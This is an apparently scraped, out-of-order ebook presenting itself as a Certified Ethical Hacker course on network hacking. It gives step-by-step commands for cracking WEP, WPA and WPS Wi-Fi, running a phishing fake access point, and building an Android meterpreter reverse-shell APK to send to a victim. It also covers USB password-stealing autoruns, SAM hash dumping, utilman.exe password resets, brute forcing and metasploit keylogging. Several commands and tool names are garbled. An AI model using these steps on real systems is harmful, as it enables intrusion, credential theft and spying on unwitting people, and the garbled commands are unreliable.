![](image-mbzbjvys.jpg)  You can crack by Gerix tool.     ![](image-oexiqpsk.jpg)  Download the file using wget command.  Uncompress the file.  Cd gerix-wifi-cracker-master  Write    \# python gerix.py    ![](image-0mzg7my8.jpg)  ![](image-6idy8wq7.jpg)  Clean all session files  Enable monitoring mode for the network.  Select mon0 and select rescan network.  Go to WEP section. Click start sniffing and logging. It will show the WEP attack control panel, and we must click Start false access point authentication on victim, then Start the chop chop attack. It will create two files, plaintext file and keystream file.     ![](image-djvnfjf7.jpg)  Then click create ARP packet to be injected on victim access point.  Then we inject the created packet in the network by clicking "inject the created packet on victim access point"  Then we go to the section web cracking to crack the password.  

   ![](image-8dyikv5j.jpg)  Click aircrack-ng decrypt WEP password. You will get the password.    In the WEP encryption, the pre shared key length is constant. They thought to find a way that has variable key and so they discovered the Temporary key integrity protocol TKIP, where it can change the key every time through four handed check. There is WEP personal where we use the pre-shared key in the authentication, while in the WEP enterprise we use the radius server in the authentication.    ![](image-m0t3u3ie.jpg)  ![](image-8jzgokmx.jpg)  ![](image-d4v73oxz.jpg)

  The key consists of TKIP (Temporary encryption key) and with it TSE and it is (IV and EIV). The two parts called key mixing. Theng they enter the RC4 Cipher. The data consists of two parts, the MSDU MIC key. The two parts go to michael alogrithms and this algorithm will secure the data so nobody can edit the data. The output of the algorithm will be segmented and the output will go to CRC-32 checksum algorithm to make error detection and correction and the output will be ICV attached with the packet. It will make XOR to the data and the key and will be put in the packet as Ciphertext.   To change the temporary key encryption, we use four ways handshake. It happens through the EAP success and this the protocol that can change th password through sending the access point sends Anoce. The smart devices that have PTK will understand the Anoce and will send with it Snoce and with it the MIC. The access point will verify the MIC and it will respond if it was ok.       ![](image-yz5akucq.jpg)  We will listen on the network through the monitoring mode. Any packet we will find will make capture for it on file. We will wait any client that makes hand check with access point and we will separate the client and we will receive the responses to capture them in file. Through the dictionary attack, we will make decrypt for the file and we will find the password  Activate monitoring mode    #airmon –ng    start  wlan1     To see the networks around me    #airodump –ng      mon0   ![](image-wga7rdv2.jpg)

  To capture the packets in a file    #airodump –ng      \-c 5 (ch no) \--bssid (mac)  \-w  www mon0    ![](image-kdq673vo.jpg)

  ![](image-alizikb9.jpg)  Open another window    #aireplay –ng  \-0  \-a (mac address of the access point) –c (mac address of client of the packet) mon0  

  ![](image-uzeekm7k.jpg)  Work with dictionary attack to crack password    #aircrack –ng  \-w /password\\ list.txt –b (mac  of access point)  www\*.cap    ![](image-b97lbc8p.jpg)  ![](image-mom5wtaw.jpg)  

![](image-sgep8ao0.jpg)  The WPA encryption had two problems. The first problem that it uses the algorithm RCA4, also when there was DOS attack on the access point, the micheal algorithm was disconnecting the wireless network for 30 sec. So they changed the RCA4 algorithm with  AES algorithm that does the encryption and transmission of the data. Everything goes to AES CCMP including the plaintext data and temporary key and PIN and mac header and it encrypts them to MIC and the data and it includes the CCMP header and MAC header.     ![](image-ads0vfec.jpg)  There is personal and enterprise editions. The personal deals with the pre shared key and the enterprise deals with the radius server in authentication.    Crack WPA2 Encryption by WPS Attack     

![](image-h2zyebpk.jpg)  We can do crack to WPA2 encryption using the dictionary attack or using WPS attack.    WPS is Wifi protected setup and it is service that can make connection between the client and access point in easy way. We go to the access point and we press the button that will operate the WPS function and we go to the client and we press the button the will operate the WPS function.  In the following video we will show how it is possible to connect sumsung with router supports WPS. Go settings. Press wireless and networks. Then WIFI settings. There is option for WPS connections, press it.     ![](image-uyrx0hk6.jpg)

  In the router there is button to enable WPS.     ![](image-5qofzr0r.jpg)  In the cisco router, we can make configuration for WPS in three methods. The first method through pressing the button for the WPS function. The second method is through you put the client WPS pin code. The third method that the  client put the WPS pin code for access point.     ![](image-74lvplby.jpg)  Activate monitoring mode    #airmon –ng    start  wlan0    To know the router that supports the WPS mode    

\# wash –I mon0 \-C    ![](image-utftr013.jpg)  Revear is a tool that can do the brute force attack on WPS service until we can reach to pin code and from it we can decrypt the WPA or WPA2 encryption.  Write    \# revear –i mon0 –b (bssid of access point)    ![](image-8wfn791p.jpg)  

We can speed up the process through giving the pin code  \# revear –i mon0 –b (bssid of access point) –p (pin code)     ![](image-lx6opwl4.jpg)  ![](image-8462wbac.jpg)  It is technique done by hacker through the network adapter. The hacker will do fake access point, anybody  connects to to this access point will go to internet through the IP forward. Any username and password written by client will occur to the hacker.    

Making easy fake access point by easy creds     

![](image-wdn2qj1n.jpg)  Go in backtrack to privilege escalation, protocol analysis, network sniffers, easy-creds.  Choose 1 to edit the file etter.conf  Change the ec\_uid=0, ec\_gid=0     ![](image-gbx9hmtn.jpg)  Remove the \# from the iptable redir\_command    ![](image-lq8f0m74.jpg)

  To edit anything in network choose 2 to edit etter.dns. We can put the ip of the phishing web site. For example if the user wants to go to it will go to another ip that has the phishing website.     ![](image-fqowvzco.jpg)  Choose 3 to install dhcp server to give the client ip address  

Choose 5 to add tunnel interface to dhcp server     ![](image-uun4xnet.jpg)  Go to home by pressing 9\. Then choose 3 fake access point attacks.Then choose 1 for fake ap statics. Choose the name of log file, ie log.Chose you don’t want site hijacking. Tell him the interface connected to internet, ie eth1. Then it asks for interface that we will make though it fake access point, choose wlan0. Then it asks the name of the fake wireless network, ie fakeap. Then it asks for the channel for access point, choose ie 4\. Then it asks monitoring mode, choose ie mon0. Then it asks tunnel interface, ie at0.  Then it asks if you already made the configuration of dhcp server, choose no to configure the dhcp server. It asks for the range of dhcp server, give him 10.0.0.0/24. Then it asks for dns, give him ie 8.8.8.8. Then the program will start all programs     ![](image-bzx2xyv0.jpg)

  Part 11: Hacking Mobile Applications    

Part 11 of Certified Ethical Hacker (CEH) Course    By    Dr. Hidaia Mahmood Alassouli    Hidaia\_alassouli@hotmail.com  

  Part 11: Mobile Platforms Hacking    ![](image-e7n59pni.jpg)  ![](image-s1j881lh.jpg) ![](image-hr1l8m19.jpg)  Open terminal and write the command to generate android payload  

  \# msfpayload android/meterpreter/reverse\_tcp LHOST=192.168.52.135 LPORT=4444 R>andro.apk    ![](image-feqmgno8.jpg)  The file will be created and will be saved in root folder.  Send the file to the victim. To accept the connection we need to open the multi handler session    \# msfconsole    Msf> use exploit/multi/handler    Msf> set payload android/meterpreter/reverse\_tcp    Msf> set LHOST 192.168.52.135    Msf> set LPORT 4444    After the victim click the file, you can use the commands: sysinfo, screenshot, keystrockes,    Full Course on Hacking of Computer Networks    By  Dr. Hidaia Mahmood Alassouli    Hidaia\_alassouli@hotmail.com  

  While every precaution has been taken in the preparation of this book, the publisher assumes no responsibility for errors or omissions, or for damages resulting from the use of the information contained herein.    HACKING OF COMPUTER NETWORKS    First edition. June 2020\.    Copyright © 2020 Dr. Hidaia Mahmood Alassouli.    Written by Dr. Hidaia Mahmood Alassouli.  

   Author Biography    I am Dr. Hidaia Mahmoud Mohamed Alassouli. I completed my PhD degree in Electrical Engineering from Czech Technical University by February 2003, and my M. Sc. degree in Electrical Engineering from Bahrain University by June 1995\. I completed also one study year of most important courses in telecommunication and computer engineering courses in Islamic university in Gaza. So, I covered most important subjects in Electrical Engineering, Computer Engineering and Telecommunications Engineering during my study. My nationality is Palestinian from gaza strip.    I obtained  a lot of certified courses in MCSE, SPSS, Cisco (CCNA), A+, Linux.    I worked  as Electrical, Telecommunicating and Computer Engineer in a lot of institutions.  I worked also as a computer networking administrator.    I had considerable undergraduate teaching experience in several types of courses in many universities. I handled teaching the most important subjects in Electrical and Telecommunication and Computer Engineering.  

  I could publish a lot of papers a top-tier journals and conference proceedings, besides I published a lot of books in Publishing and Distribution houses.    I wrote a lot of important Arabic articles on online news websites. I also have my own magazine website that I publish on it all my articles: http:// www.anticorruption.000space.com  My personal website: http://www.hidaia-alassouli.000space.com  Email: hidaia\_alassouli@hotmail.com    Abstract    The objective of the book is to summarize to the user with main topics in computer networking hacking.    The book consists of the following parts:    Part 1: Lab Setup     Part2: Foot printing and Reconnaissance    Part 3: Scanning Methodology  

  Part 4: Enumeration    Part 5:System Hacking    Part 6: Trojans and Backdoors and Viruses  

  Part 7: Sniffer and Phishing Hacking  

  Part 8: Hacking Web Servers    Part 9:Hacking Windows and Linux Systems    Part 10: Wireless Hacking    Part 11: Hacking Mobile Applications    You can download all hacking tools and materials from the following websites    http://www.haxf4rall.com/2016/02/13/ceh-v9-pdf-certified-ethical-hacker-v9-courseeducatonal-materials-tools/  

  www.mediafire.com%2Ffolder%2Fad5szsted5end%2FEduors\_Professional\_Ethical\_Hacker&h=gAQGad5Hf    Part 1: Hacking Lab Setup    Part 1 of Certified Ethical Hacker (CEH) Course    By    

Dr Hidaia Mahmood Alassouli    Hidaia\_alassouli@hotmail.com    Part 1: Setup Lab  1) Setup lab    From the virtualization technology with software VMware or virtual box we can do more than one virtual machines, one linux and other windows 2007 or windows Xp  Download vmware and install it  Create folder edurs-vm in non-windows partition. Create a folder for each operating system  

Install any windows operating system.  Download backtrack     ![](image-r2acedgm.jpg)  To install backtrack on usb, download unebootin. We need also to use the tool to support booting from flash memory in vmware.     ![](image-8w6e5f04.jpg)  Download and install kali linux     

![](image-2jyhleto.jpg)  Download and install metasploit.     ![](image-3x58mph5.jpg)  Metasploit is big project that contains a lot of modules or programs. These modules or programs can utilize the holes in windows machines or linux machines operating systems. For any hole that occur in the operating systems, we can develop the program that can utilize this hole. We can work on it through command line or graphical interface. The programs that use graphical interface are armitage and Koblet Strike . In linux we can update the metasploite using command msfupdate.    Part 2: Foot printing and Reconnaissance  Part 2 of Certified Ethical Hacker (CEH) Course    By    Dr. Hidaia Mahmood Alassouli    Hidaia\_alassouli@hotmail.com     Part 2: Foot printing and Reconnaissance    

1)Footprinting and Reconnaissance    Use nslookup to get information about server.  

see dnsstuf to get information about server domain .  Use www.ip-address.com to get information about server.  Use www.robtex.com to get information about server domain.  Use backtack or any linux machine to  know the dns servers  of certain domain. For example,    Dig Wikimedia.org    Use backtack or any linux machine to  know the A and MX records  of certain domain. For example,    Dig A Wikimedia.org    Dig MX Wikimedia.org    To see the zone transfer    Dig –t AXFR Wikimedia.org @ ns1.wikimedia.org    

We can see all the records in that dns server.  We can use the nslookup command to see the host of certain ip address    Nslookup  ptr  31.13.81.17    We can use who.is to know information about when created , and when expired and all information about that the dns servers of  domain and about the administrator. You can get  the same information from backtrack terminal. Write    whois Microsoft.com  

  We can use tool called smartwhois  to get same information.  We can use tool called countrywhois  to get information about country of a domain.  We can use tool called lanwhois to get same information from who.is.  There is tool called alchemy eye to make monitoring  for certain services in a target server. It can check the status of certain services on a server.  Use robots.txt file to know what is not allowed on the website. Eg  www.microsoft.com/robots.txt  To search site in google write eg, site:tedata.com filetype:pdf. You can search the following in google    Intitele: search in the title page    Inurl: search in the url page    

Site: search on site    Link: other sites that links to our subject    Inanchor: search on hyperlinks    Filetype: search to see pattern yet    There is google hacking data base. You can find exploits in www.exploit-db.com in ghdb section.   You can use sitedigger to get the dorks of  any site.  You can use theHarvester to get the emails of certain domain. From the backtrack write for example,    #./theharvester.py –d Microsoft.com 500 –b  google    You can search emails using the exploitation tools in back track. Type in the command line msfconsole    \#      From the command msf, write  

  search email    It will bring all modules that have emails. Take one module  

  Auxiliary /gather/ search\_email\_collector    Write    Msf> use Auxiliary /gather/ search\_email\_collector    Then write " info "    Msf> info    Then write " set DOMAIN Microsoft.com"    Msf> set DOMAIN Microsoft.com    Then write "run"    Msf> run    

You can use Maltego tool. When you run the program, choose company stalker, write the name of the company ie Microsoft.com. It will brings the email of the domain. Take the domain Microsoft.com, then click run transform.  You can use piple search or facebook.  You can use the website truecaller website to find the person of certain phone number .  You can use metadata collector tools. Two tools used, metagofil, FOCA  Metagofil  tool is in backtrack. For example write    #/pentest/enumeration/google/metagoofilo     

#./metagoofil.py –d Microsoft.com  doc,pdf  \-l 200 –n 50 –o microsoftfiles –f results.com    It will bring many emails and other information.    You need to change downloader.py to be   ![](image-dn8k1vzj.jpg)  Use foca to download files from certain servers.  Use traceroute, tracert to traceout the connections in certain server.  There is tool called tcptraceroute can bypass firewalls.  You can use geospider as tracert tool.  You can use trout tool.  

You can use visual ip trace.  You can use www.bing.com to see all the web sites on the web server. Write the Ip and you will get all websites in the same server.  

To know the type of web server, we use whatweb tool in linux.    #./whatweb www.microsoft.com    We can use httprecon tool for same purpose to know the type of web server.  We can use the site news.netcraft.com to get all information about web server.  We can use the telnet command to know the type of  web server    \# telnet  192.168.1.1 80    \# GET / HTTP / 1.0    

We can use netcat in linux to know the type of web server.    \# nc –n 192.168.28.139 80  

  \# GET / HTTP / 1.0    We can use the tool  httrack and wget  for mirroring websites. You can use them to download and save websites.    We can use in backtack THCSSLCheck tool    \# wine  THCSSLCheck www.yahoo.com 443    Or use the tool sslscan  

  #sslscan www.cnn.com    To detect the load balancing, we use the tool lbd (load balance dector)    \# www.yahoo.com    It will try to find whether it is load balancing server. It will find the type of server, whether dns or http. It will check the dns load balancing and the http load balancing. Then it will tell whether load balancing made by http or dns    You can detect the web application firewall. There is tool called wafw00f. The tool can detect some firewalls. Go to waffit  in backtrack.    www.contra.gr    Some websites can offer help in least time.Centralops.net can make service scan and network whois  and domain whois and traceroute and find dns records. Other website can do the same purpose: and serversniff.net and mrdns.com.  On firefox, add passiverecon addon and you can get from it all information about the web site you are browsing.    Part 3: Scanning Methodology    

Part 3 of Certified Ethical Hacker (CEH) Course    By  

  Dr. Hidaia Mahmood Alassouli    Hidaia\_alassouli@hotmail.com     Part 3: Scanning Methodology    

The steps for hacking: Reconnaissance, Scanning, Gaining Access, Maintaining Access, Covering Tracks    ![](image-tjltisfj.jpg)  ![](image-yjryvc5h.jpg)  Using scapy tool to send a packet     

![](image-j5tsgpzy.jpg)  ![](image-lcl1yysr.jpg)  ![](image-ornlxge9.jpg)  It will find which devices are actives in the network. There are many tools to make ping sweep: angry and hping and nmap.    Use nmap    #nmap –sn 192.168.28.0 /24  

  Use hping  Use in windows angry tools     ![](image-50cqncgx.jpg)

  Use the nmap to know the open ports in a host     ![](image-qluuuq5e.jpg)

  #nmap 192.168.152.130 \-p 80    Use the nmap to make scan on all ports    

#nmap  192.168.152.130    Use the metasploit for same purpose  

  #msfconsole    

Msf> search scanner/portscan    Msf> Use auxiliary/scanner/tcp    Msf> Info    Msf> Set RHOSTS 192.168.28.139    Msf> Set PORTS 1-1000    Msf> run    The problem if there is firewall we will not get results. In stealth scan or half open scan  

  ![](image-azao1oyd.jpg)  \# nmap –sS 192.168.28.13  \-p 80    Use the metasploit for same purpose    #msfconsole  

  Msf> search scanner/portscan    Use auxiliary/scanner/syn    

Info    Set RHOSTS 192.168.28.139    Set PORTS 1-1000    Run    We can use the ACK to know the unfiltered ports on firewall     ![](image-dzqvsdsl.jpg)  \# nmap –sA 192.168.28.138  \-p138    It will tell you it is unfiltered port in the firewall  

  Use the metasploit for same purpose    #msfconsole    Msf> search scanner/portscan    Use auxiliary/scanner/ack    Info    Set RHOSTS 192.168.28.139    Set PORTS 3380-3390    Run    It will tell you the unfiltered ports    The FIN scan is another way of scan. The computer sends FIN packet and if the host answered it, it is open port otherwise it is closed port        

![](image-g6v2nfly.jpg)  \# nmap –sF 192.168.28.138  \-p1-1000    The XMAS scan is another way of scan.  The source machine sends FIN and URG and PUSH and if the destination did not answer, then the port open and if it did answer with RST then the port close.    

  ![](image-wxdu9pq8.jpg)  \# nmap –sX 192.168.28.138  \-p80    Here the source machine sends TCP packet with NO flag set. If the destination did not answer, then the port open and if it did answer with RST then the port close.     ![](image-b1914zkk.jpg)  \# nmap –sN 192.168.28.138  \-p80    The Idel scan is another way of scan.  We want when we make scan, the destination does not register that I made the scan, but the IDS registers the Zombie that made the scan. The destination must be Idle. This technique used with the printer networks. The hacker sends SYN/ACK to zombie and it responses with RST signal. We write the packet ID. We will make packet spoofing IP. We will send the packet SYN to the target and so the target will answer to the Zombie with SYN ACK and the Zombie will answer with RST if the port is open. We will send SYN ACK again to the Zombie  and we will take the packet ID. If the packet ID increased with two numbers, the port is open.  If the packet ID increased with one number, the port is close.        ![](image-n9cdk3fs.jpg)

  ![](image-vlu3ga8x.jpg)  In UDP scan, the hacker sends UDP probe to the destination. If the destination did not answer, then the port open otherwise it is close.      ![](image-vsxx3q1e.jpg)  \# nmap –sU 192.168.28.138 –p-      (all ports)    It will show all open UDP ports.    Firewalking: It is the combination of portscanning and tracerouting technique.     ![](image-z93dzg8w.jpg)  #  hping3  1-1024  \-S  \- t 5  scanme.nmap.org    ![](image-2lkgvlih.jpg)  

The scan decoys is hiding process.    To slow down scans write    \# nmap  192.168.28.138  \-p445    

To bypass firewalls so it will not detect the nmap    \# nmap  –PN  \-g53  192.168.28.138  \-p445    ![](image-pvp8km17.jpg)  To do fingerprinting, we have many tools: NetworkMiner, P0f, Satori  In backtrack there is tool called p0f    #p0f –i eth0    

Active fingerprinting     ![](image-ywdxyxeq.jpg)  #nmap 192.168.28.135    i. Banner grapping    ![](image-ot72pl7m.jpg)  ![](image-ogaucn2u.jpg)  You can get the type of operating system by writing    \# telnet 192.168.1.20  80    GET/HTTP/1.1    In my computer, It will shows the operating system is linux. Besides it told the web server apache and the web application php    

ii. Network Scan Tools    You can use the superscan windows tool  You can use the advanced IP scanner     ![](image-klpjki5u.jpg)  In backtrack you can do scan using nmap    \# nmap  192.168.28.139    

You can use Znmap tool  You can use the nmap command    \# nmap –A –v –oA report 192.168.1.0/24 –p-    If you want to make scan without showing the offline hosts, remove –v.    \# nmap –A  –oA report 192.168.1.0/24 –p-  

  Use the program Dradis. Go backrack, reporting tools, evidence management, dradis. It works https. Go to the browser and write https//127.0.0.1:3004. Write the username admin and the password admin.     ![](image-5p1t7k8e.jpg)  In dradis, click on import from file> Choose the xml file and make upload. You will get all destinations in the subnetwork.  

  Scan by metasploit armtage     ![](image-tlrbdyf2.jpg)  Go to backtrack, exploitation tools, network exploitation tools, metasploit framework, armitage     ![](image-xp2bbp8t.jpg)  

We can use Cobalt Strike tool. You must buy the tool as it is not free     

![](image-cdspqrnx.jpg)  iii. Vulnerability Scanning    ![](image-a1vlvave.jpg)  There are many programs for vulnerability scanning: Nessus, acunetix, w3af, armitage, netsparker, cobalt strike.  Nmap scripting engines.     ![](image-1xblebya.jpg)  You can check using nmap on the version detection and operating system detection, traceroute. You can scan your  host using a script in your computer    

  ![](image-vmp50lln.jpg)  Nessus scan    ![](image-zxwefi38.jpg)In backtrack write        \# apt-get install nessus    Go to Nessus in /opt/nessus    

    \# cd /opt/Nessus        \# cd  sbin the add user with the command Nessus-adduser    ![](image-i1ixjihb.jpg)  

To register in Nessus    \# /opt/Nessus/bin    ![](image-0scj8i2v.jpg)  After you finish, go to applications, backtrack, vulnerability assessment, vulnerability scanners, nessus    In browser write htps:// 127.0.0.1:8834    add the network subnet to scan    

Use the Acunetix web vulnerability scanner     ![](image-w38nw3ty.jpg)  W3af Web Vulnerability scanner    

  ![](image-xsy5o0db.jpg)  Go to Vulnerability Assessment, Web Application Assessment, Web Vulnerability Scanner, w3af gui    Scan vulnerability using armitage and metasploit     

![](image-c09pcmdu.jpg)  

![](image-og2a2vl3.jpg)  You can use TOR proxy server    ![](image-mz934pmz.jpg)  ![](image-f2s1l3rk.jpg)  ![](image-pokj0wa2.jpg)  Use the tool super network tunnel. Install it in the server and client  and make the configuration. It is used when there is firewall the blocks all ports to server except the the http ports 80 and 443 ports and we want to communicate with the server through the open port 80 but we must install the server part of program also in the server     ![](image-j8n2x18d.jpg)  Add user. Then start server.     ![](image-oc1fl96p.jpg)  Setup the program in client computer. Give it the ip of the server. Put the user name that you created in the server and the password. You can add internet explorer over tunnel and logon through ftp tunnel    

  ![](image-m4m3ljir.jpg)  ![](image-14512m64.jpg)  Install Copssh tool in the server and create the user for a client. Activate a user.While install putty in the client.     ![](image-ist8szo2.jpg)  ![](image-zgydm9mp.jpg)  ![](image-mpnc8nin.jpg)  ![](image-dqkuc88p.jpg)  To use the SSH as proxy server     ![](image-kjse0x83.jpg)  

![](image-58t035xl.jpg)  Use nmap to do IP spoofing  

  \# nmap –e eth1 –S 192.168.15  192.168.1.10    Part 4: Enumeration    Part 4 of Certified Ethical Hacker (CEH) Course    By    Dr. Hidaia Mahmood Alassouli    Hidaia\_alassouli@hotmail.com    

  Part 4: Enumeration    ![](image-87peh11k.jpg)  ![](image-5mqvpmmm.jpg)  There is a tool called Dumpsec tool. We can get information about machines from this tool  

   ![](image-omhtiiad.jpg)  You can use sid2user and user2sid tool     ![](image-tznnz277.jpg)  ![](image-p46k1kxz.jpg)  Use nmap to see if port 161 open    \# nmap 192.168.28.137    \# nmap  192.168.28.137    Go applications, backtrack, information gathering, network analysis, snmp analysis, snmpenum    #./snmpenum.pl 192.168.1.1  public windows.txt    

![](image-d61stl18.jpg)  In mail server enumeration, we try to get information from the mail server. We can find if the mail server is open relay that spammers can send through it too many emails so it will be blacklisted    To know whether the mail server is open relay    http://www.mailradar.com/openrelay/    \[Method 3 @ 1460382427\]  <<< 220 smtp01.gov.ps ESMTP Postfix  \>>> HELO mailradar.com  <<< 250 smtp01.gov.ps  \>>> MAIL FROM: <>  <<< 250 2.1.0 Ok  \>>> RCPT TO:   <<< 554 5.7.1 : Relay access denied  \>>> QUIT  <<< 221 2.0.0 Bye  \[TEST    

All tested completed! No relays accepted by remote host!    Use the netcat in linux to detect if the server is not open relay     ![](image-miskxzz1.jpg)  Use msfconsole  

  \# search smtp    \# use auxiliary/scanner/smtp/smtp\_enum3    

#show options    \# set RHOS  213.244.82.152    \# (it will use the file)  

  Other way to get user from mail server    Go to applications, backtrack, information gathering, network analysis, smtp analysis, smtp-usr-enum. Type the command    ![](image-adfchb9w.jpg)  Another tool called smtpscan  

  Go to applications, backtrack, information gathering, network analysis, smtp analysis, smtpscan.    

\# smtpscan 213.244.82.152    ![](image-4zw0cxjn.jpg)  To do ldap enumeration the port 389 must be open.  Use the tool LDAP admin professional     ![](image-yl4ohk7u.jpg)  ![](image-3a6bd0jz.jpg)  You can use ldp.exe in windows support tools for same purpose     ![](image-i0tjvley.jpg)  We use dns enumeration using nslookup and dnsstuff.com    

Part 5: System Hacking    Part 5 of Certified Ethical Hacker (CEH) Course  

  By    Dr. Hidaia Mahmood Alassouli    Hidaia\_alassouli@hotmail.com     Part 5: System Hacking    ![](image-9d7vle5t.jpg)  ![](image-gzmx8a1w.jpg)

  ![](image-5snvkral.jpg)  In workgroup the uses name and passwords stored in the SAM file in the same machine. We can crack the passwords if we got the data on the sam file.  In the domains, the usernames and passwords are store in the domain controller.  The directory service consists of four parts: domain partition, schema partition, configuration partition and application partition. The domain contains data about all objects in network. Schema partition consists of attributes or class templates. The configuration partition consists of the  infrastructure of domain controller.  The schema partition consists of attributes and classes templates.   In active directory domains, the machine logon using Kerberos service. When the client wants to access any resource, it goes to a service under Kerberos called TGS (ticket granting service). The TGS carries TGT (ticket granting ticket). In TGT is file written on it SID for users and the security groups that the users members on them. The machine requests the TGT when it wants to access a service and the active directory grants it service ticket and session key and the machine gives the service ticket and the authentication to the service      ![](image-lawsk4dx.jpg)  ![](image-aqd48zj8.jpg)  ![](image-17h7lu1t.jpg)  Cain and Abel Tool: Using the cain and abel tool. Tell him you want to use the cart network. Choose to make arp poisoning. Choose to run NTLM authentication. Go to sniffers and then hosts and add. Click all hosts. Go to ARP and check the gateway and choose the destination that we want to make ARP poisoning.   Go and browse any machine in the network to see its share.  

   ![](image-g59mzoe2.jpg)  Then go cain and abel and click passwords and then click SMB and we will find LM hash and NTLM hash. We can from this hash crack the password.     ![](image-u6atvz0t.jpg)  ![](image-onu3eg5u.jpg)  You can find the password dictionary list in linux in You can find the password of ftp service using this command    \# hydra –l  msfadmin  \-P  /pentest/wordlists/dark0de.lst 192.168.1.3 ftp    Where msfadmin is username    

![](image-amxdagmr.jpg)  It can find the password if it is in the file list    You can use ncrack for same purpose    \# ncrack  \-u  msfadmin  \-P  /pentest/wordlists/dark0de.lst  \-p 21  192.168.281.29    ![](image-qqgm4alv.jpg)  You can download password list from     ![](image-snlurluy.jpg)  ![](image-fy29zchh.jpg)

  You have flash drive and when you put it inside the device, it will steal the information.  There is a tool in nirsoft.net to recover all types of passwords.  

   ![](image-20ygy1wh.jpg)  i. Method 1 for Stealing Passwords Using USB drive:    Take the programs in the website, mspass, pspv, passwordfox as example. Iepv\_setup.exe, mailpv\_setup.exe.  Take the programs and put them in a folder. Setup the programs iepv and mailpv and take their programs from program file.     ![](image-9f0om6qc.jpg)  Make program autorun.inf in the folder  

   ![](image-us6vf8a8.jpg)  Make program progstart.bat     ![](image-3iz8fw93.jpg)  Save the files in the root of flash. After you put the flash, the passwords will will be saved in the text file      ii. Method 2 for Stealing Passwords Using USB drive: USB Utilities    We use  USB\_Utilities    

  ![](image-ped3z07j.jpg)  Choose the USB thief. Browse. Choose the place that you extracted the usb utilities.  There will be two folders.     

![](image-kr6hw7t3.jpg)  Take the data in USBThief folder and put it in flash memory.     

![](image-zpngl5b9.jpg)  When you put the flash in the machine it will dump all passwords.  When you go home, open the dump folder.     ![](image-vvy94p1l.jpg)  ![](image-hl5s3lqa.jpg)  

When Microsoft saves the password, it saves them in LMHash. Now there is NTLM hash.  The Microsoft in work group environment registers the passwords in sam files. It is in system32/config folder. We cant do anything to the SAM file while the operating system active as it is protected.  To get the data in SAM file we have thwo methods. The first method to bring program that can extract the data in SAM file and the second method is to boot from another operating system through the live CD.     I. Method 1 to get the data in SAM file:    

This method if you are local in machine as normal user and you want to get the password of the machine for administrator.  To find the administrator user while you are not administrator, you can use cain program. Click cracker. Ask him to bring the hash for local system.     ![](image-3lzs1van.jpg)

  ![](image-y03wxuda.jpg)  ![](image-vfc5gyz2.jpg)  II. Method 2 to use CD to reset the password or crack the SAM file hash:    This method used when you are not logged in the device and you don’t have account. In this method you can reset the password using PassCape CD. The problem is that the user knows that the password was reset. So the other way is to try to crack the password in the SAM file.    ![](image-y1kxc625.jpg)  Choose to reset or change user account password. Put the new password for the user you want to change its password.   ![](image-nz07xrq8.jpg)  ![](image-vub0zxse.jpg)  Try to choose make dump export password hashes to file. Save the dumped passwords in usb drive. You must boot from the usb drive in order to save the file on it.  Open the saved text file.  

The file consists from: User name: user id: LM hash: NTLM hash    We will crack LM hash    ![](image-dghtdkbf.jpg)  You can use the website www.onlinehashcrack.com in order to crack passwords     ![](image-w4gdu5jm.jpg)  Or you can use the cain program  The dumped sam file     ![](image-4mkr1c4j.jpg)

  You can crack the sam file using the backtrack     ![](image-svowc5nc.jpg)  To see the hard disk, write in backtrack    \# fdisk –l    ![](image-q1lnmu3e.jpg)  Mount the windows partition  

  \# mount /dev/sda1  /root    #cd /Windows/system32/config    #bkhive system password1.txt    \# samdamp2 SAM password1.txt \> password2.txt  

  \# /pentest/passwords/john    \# ./john  /root/Windows/system32/config/password2.txt    ![](image-o2afw1rs.jpg)

  We want to make crack for windows 2008 domain controller so we can reset the administrator password so we can login to domain controller.   

  ![](image-nf7dunqv.jpg)  To make offline crack, put windows server 2008 in CDROM. When you login point to iso image of the windows 2008 server     ![](image-8vpi3n8s.jpg)  Restart the server. Click to esc to get the boot from menu>Choose to boot from cd  Choose repair your computer     ![](image-wvdltmnv.jpg)  

Choose command prompt. Go c:\\windows\\system32  Change the name of utilman.exe to utilman.exe.bak  Copy cmd.exe to utilman.exe     ![](image-3snf5q4n.jpg)  Restart the machine  Click utilman icon  

Write the command to reset the password    Net user administrator pass2005    ![](image-mnltelsv.jpg)  In linux the passwords registered in file /etc/shadow     

![](image-hfdyaolr.jpg)  Offline Password Cracking:     ![](image-zxfgwpdr.jpg)  Save the password files passwd and shadow to passwd.txt and shadow.txt    #Kate /etc/passwd  and save it to passwd.txt  

  #Kate /etc/shadow and save it to shadow.txt    Use the john tools    #cd /pentest/passwords/john    

#./unshadow  passwd.txt  shadow.txt  \>  crack.txt    \# ./john crack.txt    ![](image-pr0q9vmt.jpg)  

![](image-dkrsf58c.jpg)  The hashcat tool is used to decrypt the hash passwords. It can crack md5. The md5 is one way encryption, which means the password can be encrypted but cat be decrypted again.    Download hashcat to crack the md5 hash. Hashcat wil compare two hases togother. It will bring a word and encrypt it and compare it with the hash of the password and if they are equal, the two words are same. We have three vesions: hashcat, hashcat-gui, oclhashcat-plus.    ![](image-mvje08k9.jpg)  Privilege Escalation is to give the user higher privileges. Some backdoors can take administrator privileges  

  ![](image-c1bap70j.jpg)  To know the users, go c:\\documents and settings you will find the users profiles for all users in the machine  To get the information for the user, write  

  \>Net user user    Use the MS11-080 to change the privilege    \>MS11-080.py  \-0  xp    ![](image-nvu75emq.jpg)  

![](image-bldjdq63.jpg)  There are hardware keyloggers and software keylogger    

  ![](image-36rdejem.jpg)  The hardware key logger is hardware to connect the PC and keyboard to register every keyed letter. It is not detected by spyware  There are programs to detect the keyboard actions  PCspy keylogger can do the task  Actualspy can do the task     ![](image-pzbulyba.jpg)  ![](image-3x7dvt90.jpg)  You can use metasploit keylogger    ![](image-q67zfsxo.jpg)  Write  

  \# msfconsole    Msf>search  windows/browser/ms10\_    Use exploit  exploit/windows/browser/ms10\_002\_aurora    \>Set SRVHOST 192.168.128.133    (your ip)    \>Set SRVPORT 80              (the port the program will listen)    \>Set URIPATH /    \>Exploit    

\>Sessions –l (To access all sessions)    \>Session –I 1    Some commands in meterpreter  session    Hashdump  (To get the files on the accessed computer)    Getpid  (to know the level you are)  

  Migrate  948  (To increase your privilege)    Keyscan\_start  to make key logger on the cluent    Keyscan\_dump (To get the information)    ![](image-6ocflxc1.jpg)  ![](image-6mjhjd6g.jpg)  There are a lot of spyware tools   ![](image-q7hix93t.jpg)  Using Spector     ![](image-wfwun7cn.jpg)  eBlaster  

